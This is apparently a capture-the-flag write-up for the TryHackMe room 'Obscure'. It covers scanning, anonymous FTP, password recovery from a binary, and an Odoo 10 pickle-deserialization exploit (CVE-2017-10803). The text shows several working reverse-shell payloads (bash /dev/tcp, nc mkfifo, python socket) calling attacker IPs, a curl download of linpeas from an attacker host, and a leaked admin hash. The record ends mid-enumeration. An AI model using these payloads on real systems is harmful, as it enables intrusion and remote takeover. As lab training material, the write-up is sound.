<h1>Obscure</h1>
<p>2025, August 16 - Day 467</p>
<img width="1882" height="372" alt="image" src="https://github.com/user-attachments/assets/4acb4ddb-c100-440a-aa18-22443196fcf9" />


<br>


<h3>Nmap</h3>

```bash
:~/Obscure# nmap -sC -sV -Pn -p- -T4  xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.9)
| http-cookie-flags: 
|   /: 
|     session_id: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```


<h3>dirb</h3>

```bash
:~/Obscure# dirb http://xx.xxx.xx.xx

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 16 xx:xx:xx 2025
URL_BASE: http://xx.xxx.xx.xx/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://xx.xxx.xx.xx/ ----
+ http://xx.xxx.xx.xx/logo (CODE:200|SIZE:13176)                                                                                      
+ http://xx.xxx.xx.xx/web (CODE:303|SIZE:227)                                                                                         
                                                                                                                                       
-----------------
END_TIME: Sat Aug 16 xx:xx:xx 2025
DOWNLOADED: 4612 - FOUND: 2
```

<br>


```bash
:~/Obscure# dirb http://xx.xxx.xx.xx/web/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 16 xx:xx:xx 2025
URL_BASE: http://xx.xxx.xx.xx/web/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://xx.xxx.xx.xx/web/ ----
+ http://xx.xxx.xx.xx/web/login (CODE:200|SIZE:3141)                                                                                  
+ http://xx.xxx.xx.xx/web/report (CODE:302|SIZE:329)                                                                                  
+ http://xx.xxx.xx.xx/web/tests (CODE:302|SIZE:327)                                                                                   
                                                                                                                                       
-----------------
END_TIME: Sat Aug 16 22:00:46 2025
DOWNLOADED: 4612 - FOUND: 3
```

<br>
<h3>FTP</h3>

```bash
:~/Obscure# ftp xx.xxx.xx.xx
Connected to 10.201.114.50.
220 (vsFTPd 3.0.3)
Name (10.201.114.50:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             134 Jul 24  2022 notice.txt
-rwxr-xr-x    1 0        0            8856 Jul 22  2022 password
226 Directory send OK.
ftp> get notice.txt
local: notice.txt remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (134 bytes).
226 Transfer complete.
134 bytes received in 0.00 secs (1.4522 MB/s)
ftp> get password
local: password remote: password
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for password (8856 bytes).
226 Transfer complete.
8856 bytes received in 0.00 secs (61.6477 MB/s)
ftp> exit
221 Goodbye.
```

<br>

```bash
:~/Obscure# file notice.txt
notice.txt: ASCII text
:~/Obscure# cat notice.txt
From antisoft.thm security,


A number of people have been forgetting their passwords so we've made a temporary password application.
```

<br>

```bash
:~/Obscure# file password
password: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=97fe26005f73d7475722fa1ed61671e82aa481ff, not stripped
```

<br>

<p>

- SecurePaH<br>
- ssword12H<br>
- 971234596</p>

```bash
:~/Obscure# strings password
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
printf
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-X
SecurePaH
ssword12H
AWAVA
AUATL
[]A\A]A^A_
971234596
remember this next time '%s'
Incorrect employee id
Password Recovery
Please enter your employee id that is in your email
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
crtstuff.c
...
```

<br>
<h3>Ghidra</h3>

<p>

- 971234596<br>
- SecurePassword123!</p>

<br>

<img width="1149" height="718" alt="image" src="https://github.com/user-attachments/assets/aeb09ea4-e626-46d2-a467-1aee3bf831da" />


<br>

<img width="786" height="100" alt="image" src="https://github.com/user-attachments/assets/1aae5542-f2b0-4cc0-a361-0fd991216f65" />


<br>

<p>

- SecurePassword123!

<br>

<br>

<h3>/web/login</h3>
<br>

<img width="1223" height="334" alt="image" src="https://github.com/user-attachments/assets/7f9f502b-2b5e-4853-bfae-8196fd9aed18" />


<br>
<br>


<img width="1078" height="699" alt="image" src="https://github.com/user-attachments/assets/a26bb5d3-860c-4af9-8634-76f4c2754fa4" />


<br>
<br>

<img width="1103" height="515" alt="image" src="https://github.com/user-attachments/assets/e6a2d138-336f-43d3-91fc-c3cb264def24" />


<br>
<br>
<br>
<br>

<img width="1223" height="334" alt="image" src="https://github.com/user-attachments/assets/7f9f502b-2b5e-4853-bfae-8196fd9aed18" />

<br>
<br>

<br>
<h3>Exploit</h3>

```bash
:~/Obscure# searchsploit Odoo 10.0
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Odoo CRM 10.0 - Code Execution                                                                        | linux/local/44064.md
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
:~/Obscure# searchsploit -m 44064.md
  Exploit: Odoo CRM 10.0 - Code Execution
      URL: https://www.exploit-db.com/exploits/44064
     Path: /opt/exploitdb/exploits/linux/local/44064.md
    Codes: CVE-2017-10803
```

<p>or</p>

```bash
https://www.exploit-db.com/exploits/44064
```

<br>
<br>

```bash
:~/Obscure# cat exploit.py
import cPickle
import os
import base64
import pickletools

class Exploit(object):
  def __reduce__(self):
    return (os.system, (("bash -i >& /dev/tcp/xx.xxx.xx.xxx/4444 0>&1"),))

with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```



```bash
import cPickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.201.11.142/4444 >/tmp/f"),))

with open("exploit.pickle", "wb") as f:
    cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

<br>
<br>

manage Database

<img width="690" height="260" alt="image" src="https://github.com/user-attachments/assets/b90176e1-5bbf-4813-8f18-ba1415e1ab39" />

Backup

<img width="693" height="469" alt="image" src="https://github.com/user-attachments/assets/15a73aa1-4872-42ce-ac80-d3eb386a705c" />


<img width="678" height="133" alt="image" src="https://github.com/user-attachments/assets/afdf91a3-a9e7-427c-9fe7-fdee7e6d51d0" />


<img width="732" height="200" alt="image" src="https://github.com/user-attachments/assets/b6431708-bca5-4340-b103-b78bd2b808f5" />


<img width="474" height="123" alt="image" src="https://github.com/user-attachments/assets/6ff5b85b-e8aa-4da6-a08a-8f6bb0844787" />

```bash
:~/Obscure# grep -Ei "*@antisoft\.thm" dump.sql
3	Administrator	1	\N	\N	\N	2022-07-23 10:51:25.449364	0	t	\N	\N	Administrator	\N	\N	\N	\N	\N	\N	f	\N	admin@antisoft.thm	f	\N	en_US	\N	\N	\N	f	2022-07-23 10:52:10.087949	\N	\N	1	f	1	\N	\N	\N	contact	f	\N	\N	3
1	t	admin@antisoft.thm		1	3	\N	f	1	\N	\N	2022-07-23 10:52:10.087949	<span data-o-mail-quote="1">-- <br data-o-mail-quote="1">\nAdministrator</span>	$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
```

```bash
echo '$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag' > Hash
```



```bash
Odoo 10.0-20190816 (Community Edition)
```

<img width="744" height="363" alt="image" src="https://github.com/user-attachments/assets/4ddd92d3-854b-48db-aaca-a945992b3777" />


<p>exploit.py</p>



```bash
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        payload = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.201.49.195\',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'sh\')"'
        return (os.system, (payload,))

with open("exploit.pickle", "wb") as f:
    pickle.dump(Exploit(), f, pickle.HIGHEST_PROTOCOL)
```

```bash
:~/Obscure# python3 s.py
```

```bash
:~/Obscure# ls
exploit.pickle  script.py  s.py
```





<img width="1220" height="469" alt="image" src="https://github.com/user-attachments/assets/da974bec-ba42-4fd8-99a5-0f3d92cc86d3" />









<p>

- click <code>Settings</code><br>
- click x to remove Apps from the Search field<br>
- search for <code>database</code><br>
- click <code>Install</code> in  <code>Database Anonymization</code><br>
- refresh<br>
- click <code>Settings</code><br>
- click <code>Anonymize database</code><br>
- click <code>Anonymize Database</code><br>
- you should get a message: Anonymization successful.<br>Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.<br>This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.<br>
- clicked <code>Save></code><br>
- <code>Anonymization successful</code>.<br>Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.<br>This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.Mbr>
- refresh<br>
- click <code>Anonymize Database</code><br>
- click <code>Upload your file</code><br>
- click <code>Open</code><br>- 
- set up a listener in the same port considered in the payload<br>
- click <code>Reverse the Database Anonymization</code></p>

<br>
<br>


import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/10.201.49.195/443 0>&1',))

with open('exploit.pickle', 'wb') as f:
    pickle.dump(Exploit(), f)


import pickle
import os

class Exploit:
    def __reduce__(self):
        return (list, ([os.system('bash -i >& /dev/tcp/10.81.91.142/4444 0>&1')],))

with open('exploit.pickle', 'wb') as f:
    pickle.dump(Exploit(), f)



<img width="1258" height="293" alt="image" src="https://github.com/user-attachments/assets/7ed75da0-da88-4e4c-9109-aff94514e5ff" />


<img width="1232" height="332" alt="image" src="https://github.com/user-attachments/assets/cf5734a4-0c99-4220-8cf4-c5cfd52da6c4" />

<br>
<br>

<img width="1229" height="425" alt="image" src="https://github.com/user-attachments/assets/54e2784e-1bdd-4dcb-8594-7b40b93e129a" />

<br>
<br>

<img width="1239" height="420" alt="image" src="https://github.com/user-attachments/assets/c59928fc-b390-4c56-b8ba-940e41e699ea" />


<br>
<br>

<img width="678" height="510" alt="image" src="https://github.com/user-attachments/assets/09dfcb23-457d-43ab-8794-fd96cf7a4418" />

<br>
<br>

<img width="676" height="511" alt="image" src="https://github.com/user-attachments/assets/5c4110b2-1d36-4923-92c1-776515b1f8ef" />

<br>
<br>


<img width="672" height="509" alt="image" src="https://github.com/user-attachments/assets/bcf23a24-9c74-466e-9a3b-453e319ce941" />

<br>
<br>

<img width="680" height="453" alt="image" src="https://github.com/user-attachments/assets/84a7db0a-3868-41c4-a073-3724655b62ed" />

<br>
<br>

<img width="679" height="473" alt="image" src="https://github.com/user-attachments/assets/7eadf4e3-1fb1-491e-9682-3791c89c0fba" />

<br>
<br>


<img width="1255" height="623" alt="image" src="https://github.com/user-attachments/assets/1bbe92c7-f719-4ba5-aade-bfc0e35a0b01" />

<br>
<br>

<img width="1246" height="204" alt="image" src="https://github.com/user-attachments/assets/95632dfd-e8e4-40de-9c37-400288fd0f53" />

<br>
<br>

<img width="1252" height="399" alt="image" src="https://github.com/user-attachments/assets/036604b2-95c2-400e-90df-a69ed3842018" />




<img width="664" height="393" alt="image" src="https://github.com/user-attachments/assets/38722396-06bc-4c28-ace4-a96da5147d2a" />



root@ip-10-201-47-153:~/Obscure# nano exploit.py
root@ip-10-201-47-153:~/Obscure# nano exploit.py
root@ip-10-201-47-153:~/Obscure# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.201.4.52 42798
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
odoo@b8a9bbf1f380:/$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null
odoo@b8a9bbf1f380:/$ 




<br>
<br>

```bash
$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null

```


<img width="1281" height="332" alt="image" src="https://github.com/user-attachments/assets/c7601fde-89a8-4bc4-af10-f198805b32d7" />




odoo@b8a9bbf1f380:/$ pwd        
pwd
/
odoo@b8a9bbf1f380:/$ cd /var/lib/odoo
cd /var/lib/odoo
odoo@b8a9bbf1f380:~$ 


odoo@b8a9bbf1f380:~$ ls -lah
ls -lah
total 28K
drwxr-xr-x 5 odoo odoo 4.0K Feb 22  2023 .
drwxr-xr-x 1 root root 4.0K Oct 17  2019 ..
lrwxrwxrwx 1 root root    9 Feb 22  2023 .bash_history -> /dev/null
drwx------ 3 odoo odoo 4.0K Jul 23  2022 addons
-rw-r--r-- 1 odoo odoo 1.4K Sep 27 21:08 field_anonymization_main_1.pickle
drwxr-xr-x 3 odoo odoo 4.0K Jul 23  2022 filestore
-rw-r--r-- 1 root root   38 Feb 22  2023 flag.txt
drwx------ 2 odoo odoo 4.0K Sep 27 21:09 sessions
odoo@b8a9bbf1f380:~$ cat flag.txt
cat flag.txt
THM{1243b64a3a01a8732ccb96217f593520}



<img width="1339" height="358" alt="image" src="https://github.com/user-attachments/assets/972ff2f3-e10b-406b-bb89-bc5651bf3310" />







odoo@b8a9bbf1f380:/tmp$ find / -perm -4000 -ls 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
156001   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
156039   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
156006   44 -rwsr-xr-x   1 root     root        44104 Nov  8  2014 /bin/ping
156007   44 -rwsr-xr-x   1 root     root        44552 Nov  8  2014 /bin/ping6
156022   40 -rwsr-xr-x   1 root     root        40168 May 17  2017 /bin/su
142767  456 -rwsr-xr-x   1 root     root       464904 Mar 25  2019 /usr/lib/openssh/ssh-keysign
156958   40 -rwsr-xr-x   1 root     root        39912 May 17  2017 /usr/bin/newgrp
156863   44 -rwsr-xr-x   1 root     root        44464 May 17  2017 /usr/bin/chsh
156861   56 -rwsr-xr-x   1 root     root        53616 May 17  2017 /usr/bin/chfn
156909   76 -rwsr-xr-x   1 root     root        75376 May 17  2017 /usr/bin/gpasswd
156970   56 -rwsr-xr-x   1 root     root        54192 May 17  2017 /usr/bin/passwd
 10150   12 -rwsr-xr-x   1 root     root         8864 Jul 23  2022 /ret


<img width="1342" height="418" alt="image" src="https://github.com/user-attachments/assets/c13eeb38-8780-45be-8b69-dd87d98c6667" />


0doo@b8a9bbf1f380:/$ pwd
pwd
/
odoo@b8a9bbf1f380:/$ ls -lah
ls -lah
total 88K
drwxr-xr-x   1 root root 4.0K Jul 26  2022 .
drwxr-xr-x   1 root root 4.0K Jul 26  2022 ..
-rwxr-xr-x   1 root root    0 Jul 23  2022 .dockerenv
drwxr-xr-x   1 root root 4.0K Jul 23  2022 bin
drwxr-xr-x   2 root root 4.0K Jun 14  2018 boot
drwxr-xr-x   5 root root  340 Sep 27 20:42 dev
-rwxrwxr-x   1 root root 1.1K Oct 17  2019 entrypoint.sh
drwxr-xr-x   1 root root 4.0K Jul 23  2022 etc
drwxr-xr-x   2 root root 4.0K Jun 14  2018 home
drwxr-xr-x   1 root root 4.0K Oct 17  2019 lib
drwxr-xr-x   2 root root 4.0K Oct 14  2019 lib64
drwxr-xr-x   2 root root 4.0K Oct 14  2019 media
drwxr-xr-x   1 root root 4.0K Oct 17  2019 mnt
drwxr-xr-x   2 root root 4.0K Oct 14  2019 opt
dr-xr-xr-x 131 root root    0 Sep 27 20:42 proc
-rwsr-xr-x   1 root root 8.7K Jul 23  2022 ret
drwx------   1 root root 4.0K Jul 23  2022 root
drwxr-xr-x   1 root root 4.0K Oct 17  2019 run
drwxr-xr-x   1 root root 4.0K Oct 17  2019 sbin
drwxr-xr-x   2 root root 4.0K Oct 14  2019 srv
dr-xr-xr-x  13 root root    0 Sep 27 20:42 sys
drwxrwxrwt   1 root root 4.0K Sep 27 20:51 tmp
drwxr-xr-x   1 root root 4.0K Oct 14  2019 usr
drwxr-xr-x   1 root root 4.0K Oct 14  2019 var
odoo@b8a9bbf1f380:/$ 





cat entrypoint.sh
#!/bin/bash

set -e

# set the postgres database host, port, user and password according to the environment
# and pass them as arguments to the odoo process if not present in the config file
: ${HOST:=${DB_PORT_5432_TCP_ADDR:='db'}}
: ${PORT:=${DB_PORT_5432_TCP_PORT:=5432}}
: ${USER:=${DB_ENV_POSTGRES_USER:=${POSTGRES_USER:='odoo'}}}
: ${PASSWORD:=${DB_ENV_POSTGRES_PASSWORD:=${POSTGRES_PASSWORD:='odoo'}}}

DB_ARGS=()
function check_config() {
    param="$1"
    value="$2"
    if ! grep -q -E "^\s*\b${param}\b\s*=" "$ODOO_RC" ; then
        DB_ARGS+=("--${param}")
        DB_ARGS+=("${value}")
   fi;
}
check_config "db_host" "$HOST"
check_config "db_port" "$PORT"
check_config "db_user" "$USER"
check_config "db_password" "$PASSWORD"

case "$1" in
    -- | odoo)
        shift
        if [[ "$1" == "scaffold" ]] ; then
            exec odoo "$@"
        else
            exec odoo "$@" "${DB_ARGS[@]}"
        fi
        ;;
    -*)
        exec odoo "$@" "${DB_ARGS[@]}"
        ;;
    *)
        exec "$@"
esac

exit 1
odoo@b8a9bbf1f380:/$ 







odoo@b8a9bbf1f380:/tmp$ curl http://10.201.47.153:8000/linpeas.sh -o linpeas.sh
<l http://10.201.47.153:8000/linpeas.sh -o linpeas.sh                        
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  227k  100  227k    0     0  23.6M      0 --:--:-- --:--:-- --:--:-- 27.8M








______________________


+] Services
[i] Search for outdated versions
 [ - ]  bootlogs
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ - ]  dirmngr
 [ - ]  hostname.sh
 [ - ]  killprocs
 [ - ]  motd
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  odoo
 [ - ]  procps
 [ - ]  rc.local
 [ - ]  rmnologin
 [ - ]  sendsigs
 [ - ]  ssh
 [ + ]  udev
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ - ]  urandom
 [ - ]  x11-common

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
You can't write on systemd PATH so I'm not going to list relative paths executed by services

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Failed to connect to bus: No such file or directory
busctl Not Found


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
b8a9bbf1f380
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	db b5cc3d65e489 unkkuri-db
172.17.0.3	b8a9bbf1f380
nameserver 10.201.0.2
search ec2.internal

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

[+] Networks and neighbours
default		0.0.0.0
loopback	127.0.0.0
link-local	169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
172.17.0.1 dev eth0 lladdr 02:42:5b:d6:fa:32 REACHABLE
172.17.0.2 dev eth0 lladdr 02:42:ac:11:00:02 REACHABLE

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
Usage: ss [ OPTIONS ]
       ss [ OPTIONS ] [ FILTER ]
   -h, --help		this message
   -V, --version	output version information
   -n, --numeric	don't resolve service names
   -r, --resolve       resolve host names
   -a, --all		display all sockets
   -l, --listening	display listening sockets
   -o, --options       show timer information
   -e, --extended      show detailed socket information
   -m, --memory        show socket memory usage
   -p, --processes	show process using socket
   -i, --info		show internal TCP information
   -s, --summary	show socket usage summary
   -b, --bpf           show bpf filter socket information
   -Z, --context	display process SELinux security contexts
   -z, --contexts	display process and socket SELinux security contexts

   -4, --ipv4          display only IP version 4 sockets
   -6, --ipv6          display only IP version 6 sockets
   -0, --packet	display PACKET sockets
   -t, --tcp		display only TCP sockets
   -u, --udp		display only UDP sockets
   -d, --dccp		display only DCCP sockets
   -w, --raw		display only RAW sockets
   -x, --unix		display only Unix domain sockets
   -f, --family=FAMILY display sockets of type FAMILY

   -A, --query=QUERY, --socket=QUERY
       QUERY := {all|inet|tcp|udp|raw|unix|unix_dgram|unix_stream|unix_seqpacket|packet|netlink}[,QUERY]

   -D, --diag=FILE     Dump raw information about TCP sockets to FILE
   -F, --filter=FILE   read filter information from FILE
       FILTER := [ state TCP-STATE ] [ EXPRESSION ]

[+] Can I sniff with tcpdump?
No


====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
uid=105(odoo) gid=109(odoo) groups=109(odoo)

[+] Do I have PGP keys?

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
dirmngr:x:104:107::/var/cache/dirmngr:/bin/sh
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=103(systemd-timesync) groups=103(systemd-timesync)
uid=101(systemd-network) gid=104(systemd-network) groups=104(systemd-network)
uid=102(systemd-resolve) gid=105(systemd-resolve) groups=105(systemd-resolve)
uid=103(systemd-bus-proxy) gid=106(systemd-bus-proxy) groups=106(systemd-bus-proxy)
uid=104(dirmngr) gid=107(dirmngr) groups=107(dirmngr)
uid=105(odoo) gid=109(odoo) groups=109(odoo)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 21:20:28 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Last logons

wtmp begins Sat Jul 23 07:13:41 2022

[+] Last time logon each user
Username         Port     From             Latest

[+] Password policy
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version
mysql Not Found

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec
 Not Found

[+] PostgreSQL version and pgadmin credentials
Version: psql (PostgreSQL) 11.5 (Debian 11.5-3.pgdg80+1)

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
 Not Found

[+] Searching PHPCookies
 Not Found

[+] Searching Wordpress wp-config.php files
wp-config.php Not Found

[+] Searching Drupal settings.php files
/default/settings.php Not Found

[+] Searching Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
 Not Found

[+] Searching supervisord configuration file
supervisord.conf Not Found

[+] Searching cesi configuration file
cesi.conf Not Found

[+] Searching Rsyncd config file
rsyncd.conf Not Found
[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
/etc/ldap
/etc/skel/.profile    /usr/lib/python2.6/dist-packages/ldap
/usr/lib/python2.7/dist-packages/ldap
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
Port 22
PermitRootLogin without-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
 --> /etc/hosts.allow file found, read the rules:



Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
krb5.conf Not Found
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
screen Not Found

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/umount		--->	BSD/Linux(08-1996)
/bin/ping
/bin/ping6
/bin/su
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/bin/chsh
/usr/bin/chfn		--->	SuSE_9.3/10
